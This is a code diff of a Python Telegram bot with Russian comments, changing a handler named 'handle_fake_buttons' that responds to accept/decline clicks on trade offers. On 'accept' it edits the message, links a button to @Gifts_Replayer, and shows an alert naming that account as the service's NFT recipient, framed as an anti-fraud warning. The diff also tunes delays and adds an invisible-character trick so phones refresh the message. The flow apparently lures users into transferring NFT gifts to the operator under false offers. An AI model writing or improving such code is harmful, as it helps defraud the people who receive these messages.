@@ -143,13 +143,12 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- ОБРАБОТКА КНОПОК С ЗАДЕРЖКОЙ ---
+# --- ИЗМЕНЕНИЕ СООБЩЕНИЯ С КД И ХАКОМ ДЛЯ ТЕЛЕФОНА ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
     
-    # Сразу отвечаем на колбэк, чтобы убрать "часики", 
-    # но НЕ показываем окно, чтобы не блокировать экран
+    # 1. Сразу убираем "часики" с кнопки, чтобы не бесило
     await callback.answer("Обработка...")
     
     data_parts = callback.data.split(":")
@@ -161,31 +160,30 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
+    # 2. ДЕЛАЕМ ПАУЗУ (КД) 1.5 СЕКУНДЫ ПЕРЕД ИЗМЕНЕНИЕМ
+    await asyncio.sleep(1.5)
+
     if action == "accept":
-        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
+        # Добавляем невидимый пробел (\u200b), чтобы телефон понял: "Текст изменился!"
+        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name) + "\u200b"
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
         ])
+        alert_text = (
+            "⚠️ Внимание!\n\n"
+            "Получатель в этом сервисе:\n"
+            "@Gifts_Replayer.\n\n"
+            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
+        )
     else:
-        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
+        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name) + "\u200b"
         new_keyboard = None
+        alert_text = None
 
-    # --- 1. ЗАДЕРЖКА ПЕРЕД УДАЛЕНИЕМ ---
-    # Ждем 2 секунды, чтобы телефон пользователя успел обработать нажатие
-    await asyncio.sleep(2.0)
-
-    # --- 2. УДАЛЯЕМ СТАРОЕ СООБЩЕНИЕ ---
-    try:
-        if business_connection_id:
-            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
-        else:
-            await callback.message.delete()
-    except Exception as e:
-        print(f"Не удалось удалить сообщение (возможно, уже удалено): {e}")
-
-    # --- 3. ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ ---
+    # 3. РЕДАКТИРУЕМ СООБЩЕНИЕ
     kwargs = {
         "chat_id": callback.message.chat.id,
+        "message_id": callback.message.message_id,
         "text": new_text,
         "reply_markup": new_keyboard,
         "parse_mode": "HTML",
@@ -195,28 +193,31 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             prefer_large_media=True
         )
     }
+    
     if business_connection_id: 
         kwargs["business_connection_id"] = business_connection_id
 
     try:
-        await bot.send_message(**kwargs)
-    except Exception as e:
-        print(f"Ошибка отправки нового сообщения: {e}")
-        if ADMIN_ID:
-            try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
-            except: pass
+        await bot.edit_message_text(**kwargs)
+        
+        # 4. ЖДЕМ ЕЩЕ 0.5 СЕКУНДЫ, ЧТОБЫ КАРТИНКА УСПЕЛА ЗАГРУЗИТЬСЯ, И ПОКАЗЫВАЕМ ОКНО
+        if alert_text:
+            await asyncio.sleep(0.5)
+            await callback.answer(alert_text, show_alert=True)
 
-    # --- 4. ПОКАЗЫВАЕМ ВСПЛЫВАЮЩЕЕ ОКНО (ТОЛЬКО ДЛЯ "ПРИНЯТЬ") ---
-    if action == "accept":
-        alert_text = (
-            "⚠️ Внимание!\n\n"
-            "Получатель в этом сервисе:\n"
-            "@Gifts_Replayer.\n\n"
-            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
-        )
-        await callback.answer(alert_text, show_alert=True)
-    else:
-        await callback.answer()
+    except TelegramBadRequest as e:
+        if "message is not modified" in str(e).lower():
+            if alert_text:
+                await callback.answer(alert_text, show_alert=True)
+            else:
+                await callback.answer()
+        else:
+            print(f"Ошибка редактирования: {e}")
+            if ADMIN_ID:
+                try: await bot.send_message(ADMIN_ID, f"⚠️ <b>Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")
+                except: pass
+    except Exception as e:
+        print(f"Неизвестная ошибка: {e}")
 
 async def main():
     print("Бот запущен...")
